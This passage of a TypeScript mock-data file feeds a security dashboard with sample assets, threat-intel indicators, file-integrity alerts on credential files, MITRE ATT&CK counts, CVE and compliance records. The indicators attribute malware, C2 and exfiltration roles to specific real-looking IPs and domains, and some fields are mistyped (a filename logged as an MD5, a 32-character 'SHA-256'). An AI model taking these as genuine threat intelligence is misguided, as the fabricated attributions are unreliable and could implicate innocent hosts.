  { id: "ast-005", hostname: "ssh-gateway", ip: "10.0.1.10", os: "Debian 12 Bookworm", type: "server", status: "online", riskScore: 61, agentVersion: "4.7.2", lastSeen: subMinutes(now, 3), owner: "Security Team", location: "DMZ Zone-A", tags: ["internet-facing", "jump-host"] },
  { id: "ast-006", hostname: "hr-workstation-07", ip: "10.0.4.31", os: "Windows 10 Pro 22H2", type: "workstation", status: "quarantined", riskScore: 100, agentVersion: "4.6.9", lastSeen: subMinutes(now, 8), owner: "A. Jenkins", location: "HQ Floor 2", tags: ["ransomware", "isolated", "ir-active"] },
  { id: "ast-007", hostname: "fin-server-02", ip: "10.0.3.22", os: "Windows Server 2019", type: "server", status: "online", riskScore: 79, agentVersion: "4.7.2", lastSeen: subMinutes(now, 2), owner: "Finance Team", location: "DC-1 Rack-C2", tags: ["financial", "pci-dss", "critical"] },
  { id: "ast-008", hostname: "vpn-gateway", ip: "10.0.1.25", os: "Ivanti Connect Secure", type: "network", status: "degraded", riskScore: 91, agentVersion: "N/A", lastSeen: subMinutes(now, 4), owner: "Network Team", location: "DMZ Zone-B", tags: ["internet-facing", "unpatched"] },
  { id: "ast-009", hostname: "kube-master-01", ip: "10.0.1.88", os: "Ubuntu 22.04 LTS (k8s 1.29)", type: "cloud", status: "online", riskScore: 54, agentVersion: "4.7.2", lastSeen: subMinutes(now, 1), owner: "DevOps Team", location: "AWS us-east-1", tags: ["kubernetes", "production"] },
  { id: "ast-010", hostname: "exec-ws-01", ip: "10.0.2.91", os: "Windows 11 Pro 23H2", type: "workstation", status: "offline", riskScore: 100, agentVersion: "4.7.0", lastSeen: subHours(now, 2), owner: "V. Cox (CEO)", location: "Executive Suite", tags: ["uefi-bootkit", "critical", "ir-active"] },
  { id: "ast-011", hostname: "jenkins-01", ip: "10.0.1.35", os: "Ubuntu 20.04 LTS", type: "server", status: "online", riskScore: 38, agentVersion: "4.7.2", lastSeen: subMinutes(now, 3), owner: "DevOps Team", location: "DC-2 Rack-A1", tags: ["cicd", "patched"] },
  { id: "ast-012", hostname: "exchange-01", ip: "10.0.1.44", os: "Windows Server 2019 (Exchange)", type: "server", status: "online", riskScore: 67, agentVersion: "4.7.1", lastSeen: subMinutes(now, 5), owner: "IT Ops", location: "DC-1 Rack-D1", tags: ["email", "internet-facing"] },
  { id: "ast-013", hostname: "backup-server-01", ip: "10.0.5.55", os: "TrueNAS SCALE", type: "server", status: "degraded", riskScore: 82, agentVersion: "4.7.0", lastSeen: subMinutes(now, 15), owner: "IT Ops", location: "DC-1 Rack-E2", tags: ["backup", "ransomware-target"] },
  { id: "ast-014", hostname: "storage-nas", ip: "10.0.3.99", os: "TrueNAS CORE 13.0", type: "server", status: "online", riskScore: 44, agentVersion: "4.7.2", lastSeen: subMinutes(now, 2), owner: "IT Ops", location: "DC-1 Rack-F1", tags: ["storage", "production"] },
  { id: "ast-015", hostname: "finance-ws-02", ip: "10.0.5.11", os: "Windows 10 Pro 22H2", type: "workstation", status: "online", riskScore: 73, agentVersion: "4.7.2", lastSeen: subMinutes(now, 7), owner: "P. Garcia", location: "HQ Floor 1", tags: ["financial", "malware-cleaned"] },
];

// ─── THREAT INTEL ──────────────────────────────────────────────────────────────
export type IOCType = "ip" | "domain" | "md5" | "sha256" | "url" | "email";
export type ThreatCategory = "malware" | "phishing" | "c2" | "ransomware" | "botnet" | "apt" | "exploit";

export interface ThreatIntel {
  id: string;
  ioc: string;
  type: IOCType;
  category: ThreatCategory;
  confidence: number;
  active: boolean;
  firstSeen: Date;
  lastSeen: Date;
  source: string;
  description: string;
  tags: string[];
}

export const threatIntel: ThreatIntel[] = [
  { id: "ti-001", ioc: "185.220.101.45", type: "ip", category: "apt", confidence: 97, active: true, firstSeen: subDays(now, 3), lastSeen: subMinutes(now, 2), source: "Emerging Threats", description: "Tor exit node used in APT campaigns — XZ Utils exploit origin", tags: ["tor", "apt29", "xz-utils"] },
  { id: "ti-002", ioc: "45.33.32.156", type: "ip", category: "c2", confidence: 94, active: true, firstSeen: subDays(now, 7), lastSeen: subMinutes(now, 25), source: "VirusTotal", description: "Cobalt Strike C2 server — TeamServer on Linode VPS", tags: ["cobalt-strike", "c2", "apt"] },
  { id: "ti-003", ioc: "update.microsoft-cdn.net", type: "domain", category: "c2", confidence: 91, active: true, firstSeen: subDays(now, 14), lastSeen: subMinutes(now, 30), source: "DNS Sinkhole", description: "Sliver C2 DNS beacon domain — typosquatting Microsoft CDN", tags: ["sliver", "dns-beacon", "typosquatting"] },
  { id: "ti-004", ioc: "a3f7d8e2c1b940656e3f9a82d5c7b014", type: "md5", category: "malware", confidence: 99, active: true, firstSeen: subDays(now, 2), lastSeen: subHours(now, 1.5), source: "MalwareBazaar", description: "AgentTesla keylogger sample — credential harvesting variant", tags: ["agent-tesla", "keylogger", "infostealer"] },
  { id: "ti-005", ioc: "91.108.56.130", type: "ip", category: "botnet", confidence: 88, active: true, firstSeen: subDays(now, 30), lastSeen: subMinutes(now, 8), source: "AbuseIPDB", description: "Mirai botnet C2 — SSH brute force origin", tags: ["mirai", "botnet", "ssh-bruteforce"] },
  { id: "ti-006", ioc: "phish@evil-domain.ru", type: "email", category: "phishing", confidence: 96, active: true, firstSeen: subDays(now, 5), lastSeen: subMinutes(now, 40), source: "PhishTank", description: "Active phishing campaign — Office macro dropper distribution", tags: ["phishing", "macro", "emotet-loader"] },
  { id: "ti-007", ioc: "194.165.16.88", type: "ip", category: "c2", confidence: 85, active: true, firstSeen: subDays(now, 10), lastSeen: subHours(now, 13), source: "Shodan", description: "Metasploit listener / Meterpreter reverse TCP handler", tags: ["metasploit", "meterpreter", "c2"] },
  { id: "ti-008", ioc: "https://evil-domain.ru/payload.exe", type: "url", category: "malware", confidence: 99, active: true, firstSeen: subDays(now, 1), lastSeen: subHours(now, 6), source: "VirusTotal", description: "Malware dropper URL — LockBit 3.0 initial stage", tags: ["lockbit3", "ransomware", "dropper"] },
  { id: "ti-009", ioc: "185.191.126.91", type: "ip", category: "exploit", confidence: 93, active: true, firstSeen: subDays(now, 4), lastSeen: subHours(now, 1), source: "Emerging Threats", description: "Ivanti CVE-2024-21887 exploit scanning origin", tags: ["ivanti", "cve-2024-21887", "vuln-exploit"] },
  { id: "ti-010", ioc: "91.92.241.105", type: "ip", category: "exploit", confidence: 87, active: true, firstSeen: subDays(now, 8), lastSeen: subHours(now, 4.5), source: "Shodan", description: "Web scanning honeypot trigger — path traversal campaigns", tags: ["path-traversal", "web-scanner"] },
  { id: "ti-011", ioc: "b94f6f125c79e3a335284af8d08b4036", type: "sha256", category: "ransomware", confidence: 100, active: true, firstSeen: subDays(now, 15), lastSeen: subDays(now, 1), source: "MalwareBazaar", description: "LockBit 3.0 encryptor binary — confirmed ransomware sample", tags: ["lockbit3", "ransomware", "encryptor"] },
  { id: "ti-012", ioc: "104.21.88.200", type: "ip", category: "apt", confidence: 76, active: true, firstSeen: subDays(now, 21), lastSeen: subMinutes(now, 35), source: "Threat Grid", description: "APT41 infrastructure — data staging and exfiltration endpoint", tags: ["apt41", "china-nexus", "exfiltration"] },
  { id: "ti-013", ioc: "91.92.244.7", type: "ip", category: "exploit", confidence: 91, active: true, firstSeen: subDays(now, 6), lastSeen: subHours(now, 11), source: "Emerging Threats", description: "Jenkins CVE-2024-23897 mass exploitation campaign", tags: ["jenkins", "cve-2024-23897", "cicd"] },
  { id: "ti-014", ioc: "45.141.84.22", type: "ip", category: "botnet", confidence: 82, active: false, firstSeen: subDays(now, 60), lastSeen: subDays(now, 5), source: "AbuseIPDB", description: "RDP scanning bot — Mirai variant, previously active", tags: ["rdp-scan", "botnet", "inactive"] },
  { id: "ti-015", ioc: "mimikatz.exe", type: "md5", category: "apt", confidence: 100, active: true, firstSeen: subDays(now, 90), lastSeen: subDays(now, 3), source: "Internal SOC", description: "Mimikatz credential dumper — commonly used by multiple threat actors", tags: ["mimikatz", "credential-dumping", "lsass"] },
  { id: "ti-016", ioc: "microsoft-security-update.com", type: "domain", category: "phishing", confidence: 95, active: false, firstSeen: subDays(now, 45), lastSeen: subDays(now, 10), source: "PhishTank", description: "Decommissioned phishing domain impersonating Microsoft security updates", tags: ["phishing", "microsoft-impersonation", "sinkholed"] },
];

// ─── FIM EVENTS ────────────────────────────────────────────────────────────────
export type FIMAction = "created" | "modified" | "deleted" | "permission_changed" | "owner_changed";

export interface FIMEvent {
  id: string;
  timestamp: Date;
  action: FIMAction;
  filePath: string;
  host: string;
  user: string;
  severity: Severity;
  oldHash?: string;
  newHash?: string;
  oldPermissions?: string;
  newPermissions?: string;
  oldOwner?: string;
  newOwner?: string;
  acknowledged: boolean;
  whitelisted: boolean;
  description: string;
}

export const fimEvents: FIMEvent[] = [
  { id: "fim-001", timestamp: subMinutes(now, 4), action: "modified", filePath: "/etc/passwd", host: "db-primary", user: "root", severity: "critical", oldHash: "5f4dcc3b5aa765d61d8327de", newHash: "2a97516c354b68848cdbd8f1", acknowledged: false, whitelisted: false, description: "Critical system file /etc/passwd modified — potential account creation or privilege change" },
  { id: "fim-002", timestamp: subMinutes(now, 12), action: "modified", filePath: "/etc/sudoers", host: "web-prod-01", user: "www-data", severity: "critical", oldHash: "d8578edf8458ce06fbc5bb76", newHash: "e10adc3949ba59abbe56e057", acknowledged: false, whitelisted: false, description: "Sudoers file modified by web server user — unauthorized privilege escalation path" },
  { id: "fim-003", timestamp: subMinutes(now, 18), action: "created", filePath: "/tmp/.cache/svchost.exe", host: "workstation-14", user: "jsmith", severity: "critical", newHash: "a3f7d8e2c1b940656e3f9a82", acknowledged: false, whitelisted: false, description: "Suspicious executable created in temp directory — matches Emotet malware signature" },
  { id: "fim-004", timestamp: subMinutes(now, 31), action: "modified", filePath: "C:\\Windows\\System32\\drivers\\etc\\hosts", host: "hr-workstation-07", user: "SYSTEM", severity: "high", oldHash: "cfcd208495d565ef66e7dff9", newHash: "c4ca4238a0b923820dcc509a", acknowledged: false, whitelisted: false, description: "Windows hosts file modified — possible DNS hijacking or C2 redirection" },
  { id: "fim-005", timestamp: subMinutes(now, 45), action: "deleted", filePath: "/var/log/auth.log", host: "ssh-gateway", user: "attacker", severity: "critical", oldHash: "1679091c5a880faf6fb5e6087eb1b2dc", acknowledged: false, whitelisted: false, description: "Authentication log deleted — evidence of anti-forensics / log tampering" },
  { id: "fim-006", timestamp: subHours(now, 1), action: "permission_changed", filePath: "/etc/shadow", host: "db-primary", user: "root", severity: "high", oldPermissions: "640", newPermissions: "777", acknowledged: false, whitelisted: false, description: "/etc/shadow permissions changed to world-readable — password hashes exposed" },
  { id: "fim-007", timestamp: subHours(now, 2), action: "modified", filePath: "C:\\Windows\\System32\\lsass.exe", host: "exec-ws-01", user: "SYSTEM", severity: "critical", oldHash: "b4e3e3b9c2a7cf4f53028e9a", newHash: "5f4dcc3b5aa765d61d832700", acknowledged: true, whitelisted: false, description: "LSASS modified — possible credential harvesting injection (Mimikatz pattern)" },
  { id: "fim-008", timestamp: subHours(now, 3), action: "owner_changed", filePath: "/usr/bin/sudo", host: "kube-master-01", user: "webapp", severity: "high", oldOwner: "root:root", newOwner: "webapp:webapp", acknowledged: true, whitelisted: false, description: "sudo binary ownership changed to unprivileged user — privilege escalation vector" },
  { id: "fim-009", timestamp: subHours(now, 5), action: "created", filePath: "/etc/cron.d/update_check", host: "web-prod-01", user: "www-data", severity: "medium", newHash: "b026324c6904b2a9cb4b88d6d61c81d1", acknowledged: true, whitelisted: false, description: "New cron job created by web server user — possible persistence mechanism" },
  { id: "fim-010", timestamp: subHours(now, 8), action: "modified", filePath: "C:\\Users\\ajenkins\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs", host: "hr-workstation-07", user: "ajenkins", severity: "high", oldHash: "eccbc87e4b5ce2fe28308fd9f2a7baf3", newHash: "c4ca4238a0b923820dcc509a1c7b3e1f", acknowledged: false, whitelisted: false, description: "Startup script modified — ransomware persistence mechanism confirmed" },
];

// ─── MITRE ATT&CK DATA ─────────────────────────────────────────────────────────
export interface MitreTactic {
  id: string;
  name: string;
  techniques: MitreTechnique[];
}

export interface MitreTechnique {
  id: string;
  name: string;
  hits: number;
}

export const mitreTactics: MitreTactic[] = [
  {
    id: "TA0043", name: "Reconnaissance",
    techniques: [
      { id: "T1595", name: "Active Scanning", hits: 4 },
      { id: "T1596", name: "Search Open Tech Databases", hits: 1 },
      { id: "T1598", name: "Phishing for Information", hits: 2 },
    ],
  },
  {
    id: "TA0042", name: "Resource Development",
    techniques: [
      { id: "T1583", name: "Acquire Infrastructure", hits: 0 },
      { id: "T1584", name: "Compromise Infrastructure", hits: 0 },
    ],
  },
  {
    id: "TA0001", name: "Initial Access",
    techniques: [
      { id: "T1190", name: "Exploit Public-Facing App", hits: 18 },
      { id: "T1566", name: "Phishing", hits: 9 },
      { id: "T1078", name: "Valid Accounts", hits: 5 },
      { id: "T1195", name: "Supply Chain Compromise", hits: 1 },
    ],
  },
  {
    id: "TA0002", name: "Execution",
    techniques: [
      { id: "T1059", name: "Command & Scripting Interpreter", hits: 7 },
      { id: "T1204", name: "User Execution", hits: 11 },
      { id: "T1047", name: "WMI", hits: 3 },
    ],
  },
  {
    id: "TA0003", name: "Persistence",
    techniques: [
      { id: "T1542", name: "Pre-OS Boot", hits: 2 },
      { id: "T1053", name: "Scheduled Task/Job", hits: 4 },
      { id: "T1098", name: "Account Manipulation", hits: 3 },
    ],
  },
  {
    id: "TA0004", name: "Privilege Escalation",
    techniques: [
      { id: "T1611", name: "Escape to Host", hits: 2 },
      { id: "T1548", name: "Sudo and Sudo Caching", hits: 5 },
      { id: "T1134", name: "Access Token Manipulation", hits: 3 },
    ],
  },
  {
    id: "TA0005", name: "Defense Evasion",
    techniques: [
      { id: "T1027", name: "Obfuscated Files", hits: 6 },
      { id: "T1055", name: "Process Injection", hits: 8 },
      { id: "T1562", name: "Impair Defenses", hits: 4 },
    ],
  },
  {
    id: "TA0006", name: "Credential Access",
    techniques: [
      { id: "T1110", name: "Brute Force", hits: 14 },
      { id: "T1003", name: "OS Credential Dumping", hits: 6 },
      { id: "T1558", name: "Kerberoasting", hits: 4 },
      { id: "T1539", name: "Steal Web Session Cookie", hits: 2 },
    ],
  },
  {
    id: "TA0007", name: "Discovery",
    techniques: [
      { id: "T1046", name: "Network Service Discovery", hits: 9 },
      { id: "T1083", name: "File & Directory Discovery", hits: 5 },
      { id: "T1018", name: "Remote System Discovery", hits: 3 },
    ],
  },
  {
    id: "TA0008", name: "Lateral Movement",
    techniques: [
      { id: "T1550.002", name: "Pass the Hash", hits: 6 },
      { id: "T1021", name: "Remote Services", hits: 8 },
      { id: "T1047", name: "WMI Lateral", hits: 3 },
    ],
  },
  {
    id: "TA0009", name: "Collection",
    techniques: [
      { id: "T1056", name: "Input Capture", hits: 4 },
      { id: "T1025", name: "Data from Removable Media", hits: 2 },
      { id: "T1119", name: "Automated Collection", hits: 3 },
    ],
  },
  {
    id: "TA0011", name: "Command & Control",
    techniques: [
      { id: "T1071", name: "Application Layer Protocol", hits: 12 },
      { id: "T1071.004", name: "DNS C2", hits: 5 },
      { id: "T1095", name: "Non-Standard Port", hits: 3 },
    ],
  },
  {
    id: "TA0010", name: "Exfiltration",
    techniques: [
      { id: "T1041", name: "Exfil Over C2 Channel", hits: 7 },
      { id: "T1567", name: "Exfil to Cloud", hits: 4 },
      { id: "T1020", name: "Automated Exfiltration", hits: 3 },
    ],
  },
  {
    id: "TA0040", name: "Impact",
    techniques: [
      { id: "T1486", name: "Data Encrypted for Impact", hits: 5 },
      { id: "T1490", name: "Inhibit System Recovery", hits: 3 },
      { id: "T1498", name: "Network DoS", hits: 1 },
    ],
  },
];

// ─── VULNERABILITIES ──────────────────────────────────────────────────────────
export type VulnStatus = "open" | "patched" | "mitigated" | "accepted_risk" | "in_progress";

export interface Vulnerability {
  id: string;
  cveId: string;
  title: string;
  cvssScore: number;
  severity: Severity;
  affectedAssets: string[];
  exploitAvailable: boolean;
  exploitInWild: boolean;
  status: VulnStatus;
  publishedDate: Date;
  patchAvailable: boolean;
  patchNotes?: string;
  description: string;
  affectedSoftware: string;
}

export const vulnerabilities: Vulnerability[] = [
  { id: "vuln-001", cveId: "CVE-2024-3094", title: "XZ Utils Backdoor (Supply Chain)", cvssScore: 10.0, severity: "critical", affectedAssets: ["web-prod-01", "db-primary"], exploitAvailable: true, exploitInWild: true, status: "in_progress", publishedDate: subDays(now, 45), patchAvailable: true, patchNotes: "Downgrade to xz-utils 5.4.5 or below. Affected: 5.6.0, 5.6.1", description: "Malicious backdoor injected into XZ Utils compression library affecting systemd-linked SSH daemons. Remote code execution as root.", affectedSoftware: "xz-utils 5.6.0, 5.6.1" },
  { id: "vuln-002", cveId: "CVE-2024-6387", title: "regreSSHion — OpenSSH RCE", cvssScore: 8.1, severity: "high", affectedAssets: ["web-prod-01", "ssh-gateway", "db-primary"], exploitAvailable: true, exploitInWild: true, status: "open", publishedDate: subDays(now, 30), patchAvailable: true, patchNotes: "Upgrade to OpenSSH 9.8p1", description: "Race condition in OpenSSH signal handler allows unauthenticated RCE as root on glibc-based Linux systems. 32-bit systems easier to exploit.", affectedSoftware: "OpenSSH < 9.8p1 (Linux/glibc)" },
  { id: "vuln-003", cveId: "CVE-2024-21887", title: "Ivanti Connect Secure Command Injection", cvssScore: 9.1, severity: "critical", affectedAssets: ["vpn-gateway"], exploitAvailable: true, exploitInWild: true, status: "open", publishedDate: subDays(now, 60), patchAvailable: true, patchNotes: "Apply Ivanti security advisory patch immediately", description: "Command injection vulnerability in Ivanti Connect Secure VPN. Chained with CVE-2023-46805 for pre-auth RCE. Actively exploited by UNC5221.", affectedSoftware: "Ivanti Connect Secure 9.x, 22.x" },
  { id: "vuln-004", cveId: "CVE-2024-20359", title: "Cisco IOS XE Persistence Backdoor", cvssScore: 6.0, severity: "medium", affectedAssets: ["dmz-fw"], exploitAvailable: false, exploitInWild: false, status: "mitigated", publishedDate: subDays(now, 90), patchAvailable: true, patchNotes: "Cisco IOS XE 17.9.4a+ addresses this vulnerability", description: "Backdoor implant installed via previously exploited WebUI vulnerability allows persistent access by threat actor UAT4356 (Velvet Ant).", affectedSoftware: "Cisco IOS XE (multiple versions)" },
  { id: "vuln-005", cveId: "CVE-2024-23897", title: "Jenkins Arbitrary File Read", cvssScore: 9.8, severity: "critical", affectedAssets: ["jenkins-01"], exploitAvailable: true, exploitInWild: true, status: "patched", publishedDate: subDays(now, 75), patchAvailable: true, patchNotes: "Jenkins 2.442 LTS / 2.426.3 LTS patches this issue", description: "Unauthenticated arbitrary file read via Jenkins CLI allowing credential theft and RCE when combined with Groovy scripting.", affectedSoftware: "Jenkins < 2.442, < 2.426.3 LTS" },
  { id: "vuln-006", cveId: "CVE-2023-4966", title: "CitrixBleed — Session Token Leak", cvssScore: 9.4, severity: "critical", affectedAssets: ["citrix-gateway"], exploitAvailable: true, exploitInWild: true, status: "open", publishedDate: subDays(now, 120), patchAvailable: true, patchNotes: "Citrix NetScaler ADC/Gateway 14.1-8.50+", description: "Buffer overflow allows unauthenticated attackers to leak session tokens, bypassing MFA. LockBit affiliates exploited this heavily.", affectedSoftware: "Citrix NetScaler ADC/Gateway" },
  { id: "vuln-007", cveId: "CVE-2021-44228", title: "Log4Shell — Apache Log4j RCE", cvssScore: 10.0, severity: "critical", affectedAssets: ["web-prod-01"], exploitAvailable: true, exploitInWild: true, status: "patched", publishedDate: subDays(now, 900), patchAvailable: true, patchNotes: "Log4j 2.17.1+ (Java 8), 2.12.4+ (Java 7)", description: "JNDI injection in Log4j2 logging library allows unauthenticated RCE. One of the most exploited vulnerabilities in history.", affectedSoftware: "Apache Log4j 2.0-beta9 - 2.14.1" },
  { id: "vuln-008", cveId: "CVE-2024-21762", title: "Fortinet FortiOS SSL VPN RCE", cvssScore: 9.6, severity: "critical", affectedAssets: ["dmz-fw"], exploitAvailable: true, exploitInWild: true, status: "in_progress", publishedDate: subDays(now, 50), patchAvailable: true, patchNotes: "FortiOS 7.4.3+, 7.2.7+, 7.0.14+", description: "Out-of-bounds write in FortiOS SSL VPN allows unauthenticated RCE. CISA added to KEV catalog. Actively exploited.", affectedSoftware: "FortiOS 7.4.0-7.4.2, 7.2.0-7.2.6, 7.0.0-7.0.13" },
  { id: "vuln-009", cveId: "CVE-2024-1709", title: "ScreenConnect Auth Bypass", cvssScore: 10.0, severity: "critical", affectedAssets: ["web-prod-01"], exploitAvailable: true, exploitInWild: true, status: "patched", publishedDate: subDays(now, 40), patchAvailable: true, patchNotes: "ScreenConnect 23.9.8+", description: "Authentication bypass in ConnectWise ScreenConnect allows unauthenticated access to all functionality including remote code execution.", affectedSoftware: "ScreenConnect < 23.9.8" },
  { id: "vuln-010", cveId: "CVE-2021-34473", title: "ProxyShell — Exchange RCE (SSRF+RCE)", cvssScore: 9.8, severity: "critical", affectedAssets: ["exchange-01"], exploitAvailable: true, exploitInWild: true, status: "mitigated", publishedDate: subDays(now, 800), patchAvailable: true, patchNotes: "Exchange Server Security Update KB5001779+", description: "ProxyShell chain: pre-auth SSRF + EOP + arbitrary file write enabling full RCE on Exchange servers.", affectedSoftware: "Microsoft Exchange Server 2013/2016/2019" },
];

// ─── COMPLIANCE ────────────────────────────────────────────────────────────────
export type ComplianceStatus = "pass" | "fail" | "warning" | "not_applicable";

export interface ComplianceCheck {
  id: string;
  framework: string;
  control: string;
  title: string;
  status: ComplianceStatus;
  score: number;
  description: string;
  remediation?: string;
  lastChecked: Date;
}

export const complianceChecks: ComplianceCheck[] = [
  // PCI-DSS
  { id: "cc-001", framework: "PCI-DSS", control: "1.3.2", title: "Restrict inbound traffic to system components", status: "pass", score: 95, description: "Firewall rules restrict inbound internet traffic to only authorized ports/protocols", lastChecked: subHours(now, 4) },
  { id: "cc-002", framework: "PCI-DSS", control: "6.3.3", title: "All system components protected from known vulnerabilities", status: "fail", score: 31, description: "12 critical CVEs unpatched on PCI-scoped systems. Ivanti VPN and Citrix gateway require immediate patching.", remediation: "Patch CVE-2024-21887 and CVE-2023-4966 immediately. Establish patch SLA of 15 days for critical CVEs.", lastChecked: subHours(now, 4) },
  { id: "cc-003", framework: "PCI-DSS", control: "8.4.2", title: "MFA for all non-console access into CDE", status: "warning", score: 72, description: "MFA configured but 3 service accounts exempt. MFA fatigue attacks detected on cloud identity.", remediation: "Enforce MFA for all accounts. Remove service account MFA exemptions. Implement phishing-resistant MFA (FIDO2).", lastChecked: subHours(now, 4) },
  { id: "cc-004", framework: "PCI-DSS", control: "10.6.3", title: "Protect audit logs from destruction and unauthorized modifications", status: "fail", score: 15, description: "Auth logs deleted on ssh-gateway (FIM-005). SIEM log integrity not enforced for all sources.", remediation: "Implement immutable logging. Forward all logs to SIEM in real-time. Apply log integrity monitoring via FIM.", lastChecked: subHours(now, 4) },
  // CIS
  { id: "cc-005", framework: "CIS", control: "CIS-1.1", title: "Establish and maintain detailed enterprise asset inventory", status: "warning", score: 68, description: "15 assets inventoried, 3 unauthorized devices detected on network not in CMDB.", remediation: "Deploy 802.1X NAC. Integrate with CMDB. Scan weekly for unauthorized devices.", lastChecked: subHours(now, 6) },
  { id: "cc-006", framework: "CIS", control: "CIS-3.1", title: "Establish and maintain a data management process", status: "pass", score: 88, description: "Data classification policy in place. DLP deployed across endpoints and cloud.", lastChecked: subHours(now, 6) },
  { id: "cc-007", framework: "CIS", control: "CIS-5.4", title: "Restrict administrator privileges to dedicated admin accounts", status: "fail", score: 22, description: "Shared admin accounts detected. Service account with sudo on 8 servers. Admin password reuse detected.", remediation: "Implement PAM solution. Enforce dedicated admin accounts with session recording. Remove standing privileges.", lastChecked: subHours(now, 6) },
  // HIPAA
  { id: "cc-008", framework: "HIPAA", control: "§164.312(a)(1)", title: "Access Control — Unique user identification", status: "pass", score: 91, description: "All users have unique identifiers. Shared accounts eliminated Q3 2023.", lastChecked: subHours(now, 8) },
  { id: "cc-009", framework: "HIPAA", control: "§164.312(b)", title: "Audit Controls — Hardware, software, procedural mechanisms", status: "warning", score: 63, description: "Audit logging active but gaps in coverage. Cloud workloads missing agent coverage.", remediation: "Deploy agents to cloud instances. Enable CloudTrail/logging for all cloud services. Review audit log retention (6 year minimum).", lastChecked: subHours(now, 8) },
  { id: "cc-010", framework: "HIPAA", control: "§164.312(e)(1)", title: "Transmission Security — Guard ePHI during transmission", status: "pass", score: 97, description: "TLS 1.2+ enforced on all data transmission paths. Certificate management automated.", lastChecked: subHours(now, 8) },
  // NIST
  { id: "cc-011", framework: "NIST", control: "ID.AM-2", title: "Software platforms and applications are inventoried", status: "warning", score: 71, description: "SBOM partially complete. 47 applications lack vendor support status. Shadow IT detected.", remediation: "Complete SBOM with Syft/Grype. Implement CASB for shadow IT discovery. Monthly app recertification.", lastChecked: subHours(now, 3) },
  { id: "cc-012", framework: "NIST", control: "PR.AC-4", title: "Access permissions and authorizations are managed", status: "fail", score: 38, description: "Excessive permissions found on 23 accounts. Service accounts with admin rights. PIM not implemented.", remediation: "Implement JIT/JEA access. Quarterly access reviews. Deploy Privileged Identity Management.", lastChecked: subHours(now, 3) },
  { id: "cc-013", framework: "NIST", control: "DE.CM-4", title: "Malicious code is detected", status: "pass", score: 94, description: "EDR deployed on 93% of endpoints. Real-time threat detection active. Daily signature updates.", lastChecked: subHours(now, 3) },
  // SOC2
  { id: "cc-014", framework: "SOC2", control: "CC6.1", title: "Logical and Physical Access Controls", status: "warning", score: 77, description: "Access controls implemented but UEBA shows anomalous access patterns for 3 users.", remediation: "Review UBA findings. Revoke unnecessary access. Implement step-up authentication for sensitive resources.", lastChecked: subHours(now, 5) },
  { id: "cc-015", framework: "SOC2", control: "CC7.2", title: "System Monitoring and Anomaly Detection", status: "pass", score: 89, description: "SIEM with UEBA deployed. 8 anomalies detected and under investigation this week.", lastChecked: subHours(now, 5) },
  // ISO 27001
  { id: "cc-016", framework: "ISO27001", control: "A.12.6.1", title: "Management of technical vulnerabilities", status: "fail", score: 41, description: "Vulnerability management process exists but 10 critical CVEs unpatched. SLAs not met for 6 vulnerabilities.", remediation: "Implement vulnerability SLA tracking. Automate patch deployment with Ansible/WSUS. Weekly vuln scanning.", lastChecked: subHours(now, 7) },
  { id: "cc-017", framework: "ISO27001", control: "A.16.1.5", title: "Response to information security incidents", status: "pass", score: 86, description: "IR plan documented and tested. Average MTTD: 4.2h, MTTR: 18.6h for P1 incidents.", lastChecked: subHours(now, 7) },
  { id: "cc-018", framework: "ISO27001", control: "A.14.2.7", title: "Outsourced development — secure coding practices", status: "warning", score: 66, description: "SAST implemented in CI/CD but DAST missing. 3 high-severity findings in last code review.", remediation: "Add DAST to pipeline. Require code signing. Implement secret scanning (GitGuardian/Gitleaks).", lastChecked: subHours(now, 7) },
  { id: "cc-019", framework: "ISO27001", control: "A.9.4.2", title: "Secure log-on procedures", status: "pass", score: 83, description: "MFA enforced for 94% of accounts. Privileged account login logged and reviewed.", lastChecked: subHours(now, 7) },
];

// ─── UBA EVENTS ────────────────────────────────────────────────────────────────
export type UBAType = "unusual_login_time" | "impossible_travel" | "excessive_data_access" | "privilege_escalation" | "after_hours_activity" | "lateral_movement" | "data_staging" | "credential_sharing";

export interface UBAEvent {
  id: string;
  timestamp: Date;
  userId: string;
  username: string;
  department: string;
  anomalyType: UBAType;
  severity: Severity;
  riskScore: number;
  description: string;
  details: string;
  sourceIp: string;
  location?: string;
  status: "open" | "investigating" | "resolved" | "false_positive";
}

export const ubaEvents: UBAEvent[] = [
  { id: "uba-001", timestamp: subMinutes(now, 15), userId: "USR-0042", username: "mwilson", department: "Finance", anomalyType: "impossible_travel", severity: "critical", riskScore: 98, description: "Impossible travel: New York → Moscow in 47 minutes", details: "User authenticated from New York (10.0.3.22) at 08:14 UTC, then from Moscow, Russia (91.108.56.130) at 09:01 UTC. Physical travel is impossible in 47 minutes.", sourceIp: "91.108.56.130", location: "Moscow, Russia", status: "investigating" },
  { id: "uba-002", timestamp: subMinutes(now, 32), userId: "USR-0015", username: "backup_svc", department: "IT Operations", anomalyType: "privilege_escalation", severity: "critical", riskScore: 96, description: "Service account executed interactive shell with sudo -i", details: "Service account backup_svc (should be non-interactive) opened interactive root shell via sudo on db-primary. No change management ticket associated.", sourceIp: "10.0.2.55", status: "open" },
  { id: "uba-003", timestamp: subHours(now, 1), userId: "USR-0077", username: "rthompson", department: "Research", anomalyType: "data_staging", severity: "high", riskScore: 87, description: "Large volume of files compressed and moved to temp directory", details: "User rthompson accessed 847 files across finance and HR shares (well beyond baseline of ~20/day), compressed to archive.zip (2.3GB), moved to C:\\temp\\. Possible data staging prior to exfiltration.", sourceIp: "10.0.6.12", status: "open" },
  { id: "uba-004", timestamp: subHours(now, 2), userId: "USR-0031", username: "jsmith", department: "Engineering", anomalyType: "lateral_movement", severity: "high", riskScore: 84, description: "Authentication to 14 unique internal hosts within 2 hours", details: "User jsmith authenticated to 14 different internal systems within 120 minutes using NTLM — no MFA prompt triggered. Pattern consistent with network worm or APT lateral movement. Hosts include DC-01, file servers, and HR systems.", sourceIp: "10.0.2.44", status: "investigating" },
  { id: "uba-005", timestamp: subHours(now, 3), userId: "USR-0088", username: "ajenkins", department: "HR", anomalyType: "after_hours_activity", severity: "medium", riskScore: 71, description: "HR user accessing sensitive payroll data at 3:47 AM local time", details: "User ajenkins (HR department) accessed payroll database and downloaded 1,240 employee records at 03:47 AM local time. User has never previously accessed systems outside 08:00-18:00 window.", sourceIp: "10.0.4.31", status: "open" },
